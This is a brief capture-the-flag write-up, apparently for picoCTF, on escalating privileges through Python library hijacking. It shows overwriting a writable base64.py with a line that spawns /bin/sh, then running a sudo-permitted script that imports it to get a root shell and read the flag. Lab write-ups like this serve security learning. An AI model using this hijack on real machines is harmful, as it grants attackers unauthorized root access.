# Mini writeup

On the server we see a .server.py

``` python
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip) 
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info) 
```

pretty chill no real exploits here, but we look at the imported packages, we can find the files of the imports from

```python
$ python3
>>> import sys
>>> print(sys.path)
['', '/usr/lib/python38.zip', '/usr/lib/python3.8', '/usr/lib/python3.8/lib-dynload', '/usr/local/lib/python3.8/dist-packages', '/usr/lib/python3/dist-packages']
```

looking at `/usr/lib/python3.8`, we can see that base64.py has read write permissions.

We can simply use vim to overwrite base64.py to
```python
import os
os.system("/bin/sh")
```

We can look for an escalation point
```sh
$ sudo -l
# tldr
omg user u can run without a password, (NOPASSWD)
sudo /usr/bin/python3 /home/picoctf/.server.py
# so lets run that

$ sudo /usr/bin/python3 /home/picoctf/.server.py
# cat /root/.flag.txt
profit
```


